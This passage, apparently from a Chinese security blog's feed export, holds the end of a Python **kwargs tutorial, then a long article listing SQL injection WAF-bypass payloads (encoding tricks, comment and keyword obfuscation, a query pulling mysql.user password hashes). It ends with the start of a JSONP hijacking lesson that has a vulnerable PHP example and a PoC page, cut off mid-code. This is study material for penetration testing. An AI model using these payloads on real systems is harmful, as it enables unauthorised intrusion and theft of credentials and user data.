class="params">x,y,**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(x,y,kwargs)  <span class="comment"># 1 2 &#123;&#x27;z&#x27;:3,&#x27;a&#x27;:4,&#x27;b&#x27;:5&#125;</span></span><br><span class="line">    </span><br><span class="line">func(**&#123;<span class="string">&quot;x&quot;</span>:<span class="number">1</span>,<span class="string">&quot;y&quot;</span>:<span class="number">2</span>,<span class="string">&#x27;z&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">5</span>&#125;)</span><br></pre></td></tr></table></figure><h2 id="3、-混用和"><a href="#3、-混用和" class="headerlink" title="3、 混用和*"></a>3、 混用<em>和</em>*</h2><blockquote><p>*args必须在**kwargs之前</p></blockquote><p>当*args必须在**kwargs混用的时候，<code>该函数可以接受任意的实参，只要实参的顺序是对的。</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">*args,**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(args)     <span class="comment"># (1, 2, 3, 4, 5)</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)   <span class="comment"># &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2, &#x27;z&#x27;: 3, &#x27;c&#x27;: 5&#125;</span></span><br><span class="line"></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,x=<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>,c=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入绕过的学习</title>
      <link href="/2022/06/11/sql_ban_study/"/>
      <url>/2022/06/11/sql_ban_study/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SQL注入绕过介绍"><a href="#一、SQL注入绕过介绍" class="headerlink" title="一、SQL注入绕过介绍"></a>一、SQL注入绕过介绍</h1><p>SQL注入绕过技术已经是一个老生常淡的内容了，防注入可以使用某些云waf加速乐等安全产品，这些产品会自带waf属性拦截和抵御SQL注入，也有一些产品会在服务器里安装软件，例如iis安全狗、d盾、还有就是在程序理论对输入参数进行过滤和拦截，例如360webscan脚本等只要参数传入的时候就会进行检测，检测到有危害语句就会拦截。<br>SQL注入绕过的技术也有很多，但是在日渐成熟的waf产品面前，因为waf产品的规则越来越完善，所以防御就会越来越高，安全系统也跟着提高，对渗透测试而言，测试的难度就会越来越高。<br>#常见的注入绕过方法<br>##1、空格字符绕过<br>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格。<br><img src="https://img-blog.csdnimg.cn/97a675c5c0584287bc3eda42798b2bad.png" alt="在这里插入图片描述"><br>使用URL编码的方式必须要在有中间件的网站上使用，直接使用sql语句进行查询是没办法解析的。&#x3D;&#x3D;<br>可以将空格字符替换成注释&#x2F;<strong>&#x2F;，也可以使用内联注释，&#x2F;<em>!code</em>&#x2F;（关于内联注释请观看mysql文章)。<br>##2、大小写绕过<br>将字符串设置为大小写，例如and1&#x3D;1转成AND1&#x3D;1或者AnD 1&#x3D;1；<br>&#x3D;&#x3D;mysql默认是不区分大小写的。&#x3D;&#x3D;<br>##3、浮点数绕过注入<br>可以在查询语句where条件这里使用，select * from users where id&#x3D;1e0或者id&#x3D;1.1。<br>##4、NULL值绕过<br>在查询语句where条件这里使用，select * from users where id&#x3D;\N。<br>##5、引号绕过<br>如果waf拦截过滤单引号的时候，可以使用双引号在mysql里也可以用双引号作为字符。<br>比如select * from users where id&#x3D;‘1’。<br>select * from users where id&#x3D;“1”。<br>也可以将字符串转成16进制再进行查询。select hex（‘admin’） 已经select 0X61646D696E。<br>&#x3D;&#x3D;如果gpc开启了，但是注入点是整型，也可以用hex十六进制进行绕过。&#x3D;&#x3D;<br>##6、添加库名绕过<br>有些waf的拦截规则并不会拦截包含库名.表名这种模式。<br>比如 select * from users where id &#x3D; -1 union select 1,2,3 from security.users;<br>&#x3D;&#x3D;mysql中也可以添加库名查询表，例如跨库查询mysql库里的users表的内容。&#x3D;&#x3D;<br>select * from users where id &#x3D;-1 union select 1,2,concat(user,authentication_string) from mysql.user<br>##7、去重复绕过<br>在mysql查询可以使用distinct关键词去除查询的重复值，可以利用这点突破waf拦截。<br>select * from users where id&#x3D;-1 union distinct select 1,2,version() from users<br>##8、反引号绕过<br>在mysql可以使用</strong>这里是反引号**绕过一些waf拦截，字段可以加反引号或者不加，意义相同。<br>&#x3D;&#x3D;反引号前面不加空格也是可以的。&#x3D;&#x3D;<br>##9、脚本语言特性绕过<br>在 php 语言中 id&#x3D;1&amp;id&#x3D;2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截；<br>id&#x3D;1%00&amp;id&#x3D;2 union select 1,2,3 有些 waf 会去匹配第一个 id 参数 1%00 ，%00 是截断字符，waf 会自动截断，从而，不会检测后面的内容，到了程序中 id 就是等于 id&#x3D;2 union select 1,2,3 从绕过注入拦截；<br>name&#x3D;%00name&#x3D;’ union select 1,(select version() from users limit 1)–+<br>其他语言特性：<img src="http://120.48.107.243:9090/blog/2023/04/03/2c4e8fe5ab5f4fec8cfc1b1740662c46.png" alt="在这里插入图片描述"></p><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><p>目前有些防注入脚本都会对逗号进行拦截，例如常规注入中必须包含逗号；<br>select * from users where id&#x3D;1 union select 1,2,3;<br>&#x3D;&#x3D;不用逗号是指定不行的。&#x3D;&#x3D;<br>##11、substr截取字符串<br>select(substr(database() from 1 for 1));<br>查询当前库第一个字符；<br> 查询 s 等于 select(substr(database() from 1 for 1));页面返回正常；<br> 同样我们也可以一个一个字符往后查</p><h2 id="12、mid截取字符串"><a href="#12、mid截取字符串" class="headerlink" title="12、mid截取字符串"></a>12、mid截取字符串</h2><p>mid() 函数跟 substr() 函数功能相同,如果 substr() 函数被拦截或者过滤可以使用这个函数代替 ；<br>select mid(database() from 1 for 1);  # 方法如上；<br>select * from users where id&#x3D;1 and ‘s’&#x3D;(select(mid(database() from 1 for 1)));<br>select * from users where id&#x3D;1 and 0x73&#x3D;(select(mid(database() from 1 for 1)));<br>name&#x3D;vince’ and (select(mid(database() from 1 for 1)))&#x3D;’p’–+<br>name&#x3D;1’ or (select(mid(database() from 1 for 1)))&#x3D;’p’–+<br>##13、使用join绕过<br>使用 join 自连接两个表 ;<br>union select 1,2  #等价于  union select * from (select 1)a join (select 2)b<br>#a 和 b 分别是表的别名；<br>select * from users where id&#x3D;-1 union select 1,2,3;  # 可以变成下面的语句；<br>   select * from users where id&#x3D;-1 union select * from (select 1)a join (select 2)b join(select 3)c;<br>   select * from users where id&#x3D;-1 union select * from (select 1)a join (select 2)b join(select user())c;<br>##14、like绕过<br>使用 like 模糊查询 select user() like ‘%r%’; 模糊查询成功返回 1 否则返回 0 ；<br> 找到第一个字符后继续进行下一个字符匹配，从而找到所有的字符串，最后就是要查询的内容，这种 SQL 注入语句也不会存在逗号，从而绕过 waf 拦截；<br>select * from users where id&#x3D;1 and (select user() like ‘%r%’);<br>select * from users where id&#x3D;-1 union select 1,2,user() like ‘%root%’ limit 1;<br>##15、limit offset绕过<br>SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回一条记录，如果对逗号进行拦截时，可以使用 limit 1 默认返回第一条数据；也可以使用 limit 1 offset 0 从零开始返回第一条记录，这样就绕过 waf 拦截了。<br>##16、or和xor not绕过。<br>目前主流的 waf 都会对：<br>•<br>• id&#x3D;1 and 1&#x3D;2、<br> id&#x3D;1 or 1&#x3D;2、<br>id&#x3D;0 or 1&#x3D;2<br>id&#x3D;0 xor 1&#x3D;1 limit 1 、<br>id&#x3D;1 xor 1&#x3D; 2</p><p>对这些常见的 SQL 注入检测语句进行拦截，像 and 这些还有字符代替；<br>字符如下：<br>• and 等于&amp;&amp;<br>• or 等于 ||<br>• not 等于 !<br>• xor 等于<br>所以可以转换成这样：<br>•<br>• id&#x3D;1 and 1&#x3D;1 等于 id&#x3D;1 &amp;&amp; 1&#x3D;1<br>• id&#x3D;1 and 1&#x3D;2 等于 id&#x3D;1 &amp;&amp; 1&#x3D;2<br>• id&#x3D;1 or 1&#x3D;1 等于 id&#x3D;1 || 1&#x3D;1<br>• id&#x3D;0 or 1&#x3D;0 等于 id&#x3D;0 ||  1&#x3D;0<br>• in<br>•<br>• in运算符用来判断表达式的值是否位于给出的列表中；如果是，返回值为 1，否则返回值为 0；<br>•<br>• not in<br>•<br>• NOT IN 用来判断表达式的值是否不存在于给出的列表中；如果不是，返回值为 1，否则返回值为 0；<br>&#x3D;&#x3D;注意：在url使用逻辑运算符的时候要url编码；&#x3D;&#x3D;</p><h2 id="17、ascii字符对比绕过"><a href="#17、ascii字符对比绕过" class="headerlink" title="17、ascii字符对比绕过"></a>17、ascii字符对比绕过</h2><p>许多 waf 会对 union select 进行拦截，而且通常比较变态，那么可以不使用联合查询注入，可以使用字符截取对比法，进行突破；<br>select substring(user(),1,1); </p><h1 id="返回第一位"><a href="#返回第一位" class="headerlink" title="返回第一位"></a>返回第一位</h1><p>select * from users where id&#x3D;1 and substring(user(),1,1)&#x3D;’r’;</p><h1 id="字符匹配第一位"><a href="#字符匹配第一位" class="headerlink" title="字符匹配第一位"></a>字符匹配第一位</h1><p>select * from users where id&#x3D;1 and ascii(substring(user(),1,1))&#x3D;114;</p><h1 id="ascii码匹配"><a href="#ascii码匹配" class="headerlink" title="ascii码匹配"></a>ascii码匹配</h1><p>最好把’r’换成成 ascii 码，如果开启 gpc int 整形注入就不能用了 ；<br>  我们可以看到不使用联合查询(union select)也可以把数据查询出来 ；<br>##18、等号绕过<br>如果程序会对&#x3D;进行拦截 ，可以使用 like rlike regexp 或者使用 &lt; 或者 &gt;<br>select * from users where id&#x3D;1 and ascii(substring(user(),1,1))&lt;115;<br>select * from users where id&#x3D;1 and ascii(substring(user(),1,1))&gt;115;</p><h2 id="19、双关键词绕过"><a href="#19、双关键词绕过" class="headerlink" title="19、双关键词绕过"></a>19、双关键词绕过</h2><p>有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患；<br>双关键字绕过（若删除掉第一个匹配的 union 就能绕过）：<br>id&#x3D;-1’UNIunionONSeLselectECT 1,2,3–+<br>到数据库里执行会变成：<br>id&#x3D;-1’UNION SeLECT 1,2,3–+<br>从而绕过注入拦截；<br>这种方式也是需要程序配合的，如果有安全防护，可以试试；<br>##20、二次编码绕过<br>有些程序会解析二次编码，造成 SQL 注入，因为 url 两次编码过后，waf 是不会拦截的；<br>-1 union select 1,2,3,4#<br>第一次转码：<br>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23<br>第二次转码：<br>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33<br>•  注意：中间件只会进行一次解码，不会解析两次url编码的，两次编码 waf 是不会拦截的；<br>• 一般二次编码都是中间件进行了一次解码，然后程序内又进行了一次，才会解析，程序内一般用的都是函数urldecode函数；<br>• 所以，不管是开了gpc或者waf都是可以绕过的，而且不会拦截； </p><h2 id="21、使用生僻函数绕过"><a href="#21、使用生僻函数绕过" class="headerlink" title="21、使用生僻函数绕过"></a>21、使用生僻函数绕过</h2><p>使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数 ；<br>select polygon((select * from (select * from (select @@version) f) x));<br>空间函数，要求版本的；<br>• 报错注入函数参考： <a href="https://blog.csdn.net/weixin_46706771/article/details/112770568">https://blog.csdn.net/weixin_46706771/article/details/112770568</a><br>##22、分块传输绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2a733a5ae666482b9bc78cc5af03527e.png" alt="在这里插入图片描述"><br>##23、信任白名单绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c415d4d7c894462db9f0c3ff6b19cc1f.png" alt="在这里插入图片描述"><br>##24、静态文件绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d715677260a24c46886b44dbcbe136ed.png" alt="在这里插入图片描述"><br>##25、pipline绕过注入<br> http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据）， 其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止。<br>##26、利用multipart&#x2F;form-data绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c66248c3a89b4cba8f81a2820c649ef6.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/8e70af939b8d4cfb9eabb8379a5faf80.png" alt="在这里插入图片描述"><br> 还有一种方法，逻辑性的方法，通过上传一张图片绕过，因为一些waf在匹配到一个图片的包参数时，就不会接着往下继续匹配其他的参数，从而进行绕过；<br>上面的from表单内加入以下代码：<br>    <input type="file" name="file"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/46f85155064e4d5f90660bbf8c577a8b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2104842e6d9c4c7ba886c3fd4d0419c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a5ebfa0645df4b2ab050efe6f05f5003.png" alt="在这里插入图片描述"></p><h2 id="27、order-by绕过"><a href="#27、order-by绕过" class="headerlink" title="27、order by绕过"></a>27、order by绕过</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c990d510d7784ce39fd5794e12a78319.png" alt="在这里插入图片描述"><br>##28、运行大量字符绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/921ae439280b40a2b870ac7fb678f912.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/d5f7bc15174048228d6d7139947a4600.png" alt="在这里插入图片描述"><br>id&#x3D;1 and (select 1)&#x3D;(select 0xA*1000)union select 1,user()–+</p><h1 id="可以直接乘1000个，系统会执行；"><a href="#可以直接乘1000个，系统会执行；" class="headerlink" title="可以直接乘1000个，系统会执行；"></a>可以直接乘1000个，系统会执行；</h1><h1 id="可以ctrl-u做一下url编码；"><a href="#可以ctrl-u做一下url编码；" class="headerlink" title="可以ctrl+u做一下url编码；"></a>可以ctrl+u做一下url编码；</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3b1e3a4bd0d545b49f12f013a45aa843.png" alt="在这里插入图片描述"><br>id&#x3D;1+and+(select+1)and+(select+0xA<em>1000)&#x2F;</em>!union*&#x2F;&#x2F;<em>!select</em>&#x2F;+1,user()–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bb4c299b933b422489d78e86844a2032.png" alt="在这里插入图片描述"></p><h2 id="29、花括号绕过"><a href="#29、花括号绕过" class="headerlink" title="29、花括号绕过"></a>29、花括号绕过</h2><p>花括号，左边是注释的内容，这样可以绕一些 waf 的拦截；<br>select 1,2 union select{x 1},user()<br>    花括号内的x可以为任意字符串，不能是数字，相当于注释的意思<br>select * from users where id&#x3D;1 union select{xxx 1},{xxx 2},{xxx 3},user();<br>##30、使用ALL或者DISTINCT绕过<br><img src="https://img-blog.csdnimg.cn/cb625b7df67e4ced95d58451f5ec36c4.png" alt="在这里插入图片描述"><br>##31、换行混绕绕过<br>目前很多 waf 都会对 union select 进行过滤的，因为使用联合查询这两个关键词是必须的，一般过滤这个两个字符，想用联合查询就很难了；<br>可以使用换行加上一些注释符进行绕过；<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5209c2b81a2d462eaa0f8b63fb7c61d4.png" alt="在这里插入图片描述"></p><h2 id="32、编码绕过"><a href="#32、编码绕过" class="headerlink" title="32、编码绕过"></a>32、编码绕过</h2><p>原理：<br> 形式：”%” 加上 ASCII 码（先将字符转换为 ASCII 码，再转为 16 进 制），其中加号 “+” 在 URL 编码中和 “%20” 表示一样，均为空格；<br> 当遇到非 ASCII 码表示的字符时，如中文，浏览器或通过编写 URLEncode，根据 UTF-8、GBK 等编码 16 进制形式，进行转换，如“春”的 UTF-8 编码为 E6 98 A5，因此其在支持 UTF-8 的情况下，URL 编码为%E6%98%A5。值得注意的是，采取不同的中文编码，会有不同的 URL 编码；<br> 在 URL 传递到后台时，首先 web 容器会自动先对 URL 进行解析，容器解码时会根据设置（如 jsp 中，会使用 request.setCharacterEncoding(“UTF-8”)），采用 UTF-8 或 GBK 等其中一种编码进行解析，这时，程序无需自己再次解码，便可以获取参数（如使用 request.getParameter(paramName)<br>但是，有时从客户端提交的 URL 无法确定是何种编码，如果服务器选择的编码方式不匹配，则会造成中文乱码，为了解决这个问题，便出现了二次 URLEncode 的方法 。 在客户端对 URL 进行两次 URLEncode ， 这样类似上面提到的%E6%98%A5 则会编码为%25e6%2598%25a5，为纯 ASCII 码。Web 容器在接到 URL 后，自动解析一次，因为不管容器使用何种编码进行解析，都支持 ASCII 码，不会出错。然后在通过编写程序对容器解析后的参数进行解码，便可正确得到参数。在这里，客户端的第一次编码，以及服务端的第二次解码，均是由程序员自己设定的，是可控的，可知的；</p><h2 id="33、HTTP数据编码绕过"><a href="#33、HTTP数据编码绕过" class="headerlink" title="33、HTTP数据编码绕过"></a>33、HTTP数据编码绕过</h2><p><img src="https://img-blog.csdnimg.cn/31eec5b618af4af69c876a255dfdfac8.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/4b1d6487e26645ecaaba7b79b17e676b.png" alt="在这里插入图片描述"></p><h2 id="34、Unicode编码绕过"><a href="#34、Unicode编码绕过" class="headerlink" title="34、Unicode编码绕过"></a>34、Unicode编码绕过</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d1b2bb18a4f64012bace3de3175a7417.png" alt="在这里插入图片描述"><br>##35、union select绕过<br>目前不少 waf 都会使用都会对 union select 进行拦截，单个不拦截 ，一起就进行拦截；<br>针对单个关键词绕过：<br>sel&lt;&gt;ect      程序过滤&lt;&gt;为空 脚本处理<br>sele&#x2F;<strong>&#x2F;ct      程序过滤&#x2F;</strong>&#x2F;为空<br>&#x2F;<em>!%53eLEct</em>&#x2F;      url编码与内联注释<br>se%0blect           使用空格绕过<br>sele%ct               使用百分号绕过<br>%53eLEct            编码绕过<br>大小写 ：<br>uNIoN sELecT 1,2<br>union all select 1,2<br>union DISTINCT select 1,2<br>null+UNION+SELECT+1,2<br>&#x2F;<em>!union</em>&#x2F;&#x2F;<em>!select</em>&#x2F;1,2<br>union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2<br>and(select 1)&#x3D;(Select 0xA<em>1000)&#x2F;</em>!uNIOn*&#x2F;&#x2F;<em>!SeLECt</em>&#x2F; 1,user()<br>&#x2F;<em>!50000union</em>&#x2F;&#x2F;<em>!50000select</em>&#x2F;1,2<br>&#x2F;<em>!40000union</em>&#x2F;&#x2F;<em>!40000select</em>&#x2F;1,2<br>%0aunion%0aselect 1,2<br>%250aunion%250aselect 1,2<br>%09union%09select 1,2<br>%0caunion%0cselect 1,2<br>%0daunion%0dselect 1,2<br>%0baunion%0bselect 1,2<br>%0d%0aunion%0d%0aselect 1,2<br>–+%0d%0aunion–+%0d%0aselect–+%0d%0a1,–+%0d%0a2<br>&#x2F;<em>!12345union</em>&#x2F;&#x2F;<em>!12345select</em>&#x2F;1,2;<br>&#x2F;<em>中文</em>&#x2F;union&#x2F;<em>中文</em>&#x2F;select&#x2F;<em>中文</em>&#x2F;1,2;<br>&#x2F;<em>输入法表情 <em>&#x2F;union&#x2F;</em> 输入法表情</em>&#x2F;select&#x2F;* 输入法表情 <em>&#x2F;1,2;<br>&#x2F;</em>!union*&#x2F;&#x2F;<em>!00000all</em>&#x2F;&#x2F;<em>!00000select</em>&#x2F;1,2</p><h1 id="三、总结与小计"><a href="#三、总结与小计" class="headerlink" title="三、总结与小计"></a>三、总结与小计</h1><p>虽然SQL注入绕过方式有很多，但是我们的大脑是活动的，是思考的，要去思考如何去工作，建立理论，付出实践，才能得到结果，有问题的地方请指出，万分感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> SQL注入绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> SQL注入绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jsonp的学习</title>
      <link href="/2022/06/10/jsonp_study/"/>
      <url>/2022/06/10/jsonp_study/</url>
      
        <content type="html"><![CDATA[<p>声明：本篇文章仅用于自己的学习交流，笔记记录以及感悟记载，不得用于其他用途。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/027f5010e9a84d6db4cd133af6cb486d.png" alt="在这里插入图片描述"><br>（&#x3D;&#x3D;图片来源于百度百科。&#x3D;&#x3D;)</p><h1 id="一、同源策略"><a href="#一、同源策略" class="headerlink" title="一、同源策略"></a>一、同源策略</h1><h2 id="1、什么是同源策略"><a href="#1、什么是同源策略" class="headerlink" title="1、什么是同源策略"></a>1、什么是同源策略</h2><p><strong>SOP</strong>，全称为同源策略 (Same Origin Policy)，该策略是浏览器的一个安全基石，<code>如果没有同源策略，那么，你打开了一个合法网站，又打开了一个恶意网站。那么恶意网站的脚本能够随意的操作合法网站的任何可操作资源，没有任何限制。</code><strong>浏览器要严格隔离两个不同源的网站，目的是保证数据的完整性和机密性。</strong>（&#x3D;&#x3D;PS：进了别人家客厅，没有允许就不要进卧室了。&#x3D;&#x3D;）<br>##2、什么算是同源<br>那么何为同源呢，即两个站点需要满足同协议，同域名，同端口这三个条件。”同源” 的定义：（&#x3D;&#x3D;PS：三个缺一不可，一个不一样就不同源。&#x3D;&#x3D;）</p><h2 id="3、不受同源策略限制的"><a href="#3、不受同源策略限制的" class="headerlink" title="3、不受同源策略限制的"></a>3、不受同源策略限制的</h2><p><strong>下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</strong><br>（&#x3D;&#x3D;PS：特权。&#x3D;&#x3D;）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;...&quot;&gt;   //加载本地js执行</span><br><span class="line">&lt;img src=&quot;...&quot;&gt;     //图片</span><br><span class="line">&lt;link href=&quot;...&quot;&gt;    //css</span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;  //任意资源</span><br></pre></td></tr></table></figure><h1 id="二、Jsonp"><a href="#二、Jsonp" class="headerlink" title="二、Jsonp"></a>二、Jsonp</h1><h2 id="1、什么是Jsonp"><a href="#1、什么是Jsonp" class="headerlink" title="1、什么是Jsonp"></a>1、什么是Jsonp</h2><p>JSONP是 JSON with padding（填充式JSON或参数式JSON）的简写 , 是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理就是动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的 <strong>src</strong> 不受同源策略约束来跨域获取数据。说人话 : 就是可以让网页从别的域名（网站）那获取资料， 即跨域读取数据。 （&#x3D;&#x3D;PS：说白了，你在客厅，我允许你帮我进卧室拿东西。&#x3D;&#x3D;）</p><p>JSONP由两部分组成：<code>回调函数</code>和<code>数据</code></p><p>回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><h2 id="2、Jsonp劫持漏洞"><a href="#2、Jsonp劫持漏洞" class="headerlink" title="2、Jsonp劫持漏洞"></a>2、Jsonp劫持漏洞</h2><h3 id="（1）简介"><a href="#（1）简介" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>JSON 劫持又为 “JSON Hijacking” ，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，<strong>如果服务器端对JSONP 的请求来源校验不严格 ,那么攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的</strong>。（&#x3D;&#x3D;PS：还是需要诱导用户去点击的。&#x3D;&#x3D;）<br>###（2）原理<br>所以说 Json 与 csrf 类似，都是需要用户登录帐号，身份认证还没有被消除的情况下访问攻击者精心设计好的的页面。就会获取 json 数据，把 json 数据发送给攻击者。寻找敏感 json 数据 api 接口，构造恶意的代码。 发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。  </p><h3 id="（3）产生漏洞的原因"><a href="#（3）产生漏洞的原因" class="headerlink" title="（3）产生漏洞的原因"></a>（3）产生漏洞的原因</h3><p><strong>网站没有对jsonp请求的来源进行校验和过滤导致任意域都能获取到数据</strong></p><p>下面以一个具体的事例来演示jsonp劫持漏洞</p><p>具有jsonp漏洞的php源码 </p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;admin&quot;,&quot;phone&quot; : &quot;15855887890&quot;,&quot;email&quot; : &quot;admin@qq.com&quot;&#125;)&#x27;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接访问url , 先不要管这个url对应的参数是怎么知道的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.130/user.php?callback=jsonp2</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/86307cabcb79431b95449467e4aa3c8a.png" alt="在这里插入图片描述"></p><p>根据url参数 , 以及返回的有敏感信息 , 猜想可能存在jsonp劫持漏洞 , 构建 poc</p><p>poc模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&#x27;en&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    jsonp劫持测试</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> 回调函数的名字(data)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.xxx.com/api?jsonp=回调函数的名字&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实战中只需要修改src对应的值 , 并把该文件放在vps上即可 </p><p>SRC挖掘中只有返回了敏感信息的jsonp劫持才能算是有危害</p><p>jsonp.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span 